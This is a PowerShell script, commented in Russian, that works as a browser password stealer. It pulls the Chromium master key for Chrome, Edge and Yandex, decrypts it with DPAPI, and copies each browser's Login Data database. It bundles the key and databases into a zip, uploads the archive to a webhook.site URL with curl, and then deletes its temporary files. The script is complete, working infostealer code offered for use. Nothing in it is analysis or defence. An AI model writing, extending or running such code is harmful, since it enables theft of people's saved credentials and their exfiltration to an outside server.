# [ Настройки ]
$webhookUrl = "https://webhook.site/94f7a3be-c2d7-4eaa-872b-7a1e5897bf12"
$reportFile = "$env:TEMP\passwords_report.txt"
$workDir = "$env:TEMP\browser_data"

# КРИТИЧНО: Подгружаем библиотеку для расшифровки мастер-ключа
Add-Type -AssemblyName System.Security

# Создаем папку для сбора файлов
if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# Функция для расшифровки Chromium (Chrome, Edge, Yandex)
function Get-ChromiumPasswords($path, $localStatePath, $browserName) {
    if (!(Test-Path $path) -or !(Test-Path $localStatePath)) { return }
    
    try {
        # 1. Извлекаем и расшифровываем мастер-ключ
        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
        $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)[5..$([Convert]::FromBase64String($localState.os_crypt.encrypted_key).Length-1)]
        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

        # 2. Пишем ключ в отчет
        Add-Content $reportFile "`n--- $browserName ---"
        Add-Content $reportFile "Master Key: $([Convert]::ToBase64String($masterKey))"
        
        # 3. Копируем саму базу данных (её мы тоже отправим)
        Copy-Item $path -Destination "$workDir\$browserName`_LoginData" -Force
    } catch {
        Add-Content $reportFile "Ошибка при обработке $browserName: $_"
    }
}

# Пути к браузерам
$browsers = @{
    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data";
    "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data";
    "Yandex" = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"
}

# Очистка старого отчета
if (Test-Path $reportFile) { Remove-Item $reportFile }

# Сбор данных
foreach ($b in $browsers.Keys) {
    $base = $browsers[$b]
    # Проверяем Default профиль (как в твоем исходном коде)
    Get-ChromiumPasswords "$base\Default\Login Data" "$base\Local State" $b
}

# Переносим текстовый отчет в общую папку
if (Test-Path $reportFile) { Move-Item $reportFile -Destination "$workDir\report.txt" }

# Отправка всего архивом на Webhook
if (Test-Path $workDir) {
    $zipFile = "$env:TEMP\data_package.zip"
    Compress-Archive -Path "$workDir\*" -DestinationPath $zipFile -Force
    
    # Отправка через curl (как ты привык)
    & curl.exe -X POST -F "file=@$zipFile" $webhookUrl
    
    # Чистка
    Remove-Item $zipFile -Force
    Remove-Item $workDir -Recurse -Force
}
